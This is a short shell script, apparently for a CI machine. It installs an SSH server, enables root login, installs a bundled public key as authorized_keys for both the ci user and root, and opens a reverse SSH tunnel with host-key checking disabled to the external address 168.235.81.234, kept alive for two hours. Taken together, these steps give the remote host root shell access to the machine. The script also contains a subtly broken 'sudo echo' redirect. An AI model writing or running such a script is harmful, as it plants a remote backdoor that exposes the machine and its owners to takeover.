OWD=$(pwd)

sudo apt install -y openssh-server
sudo echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
sudo service ssh start

eval $(ssh-agent)

cd /home/ci
unzip ${OWD}/files.zip
mkdir .ssh
sudo chmod u=rwx,g=rx,o-rwx /home/ci /home/ci/.ssh
cp id_ed25519.pub .ssh/authorized_keys
chmod go+r .ssh/authorized_keys
ssh-add id_ed25519
ls -lh
ls -lh .ssh/

sudo mkdir -p /root/.ssh
sudo chmod u=rwx,g=rx,o-rwx /root /root/.ssh
sudo mv id_ed25519.pub /root/.ssh/authorized_keys
sudo chmod go+r /root/.ssh/authorized_keys

ssh -o stricthostkeychecking=no -R 22001:127.0.0.1:22 root@168.235.81.234 "sleep 2h"

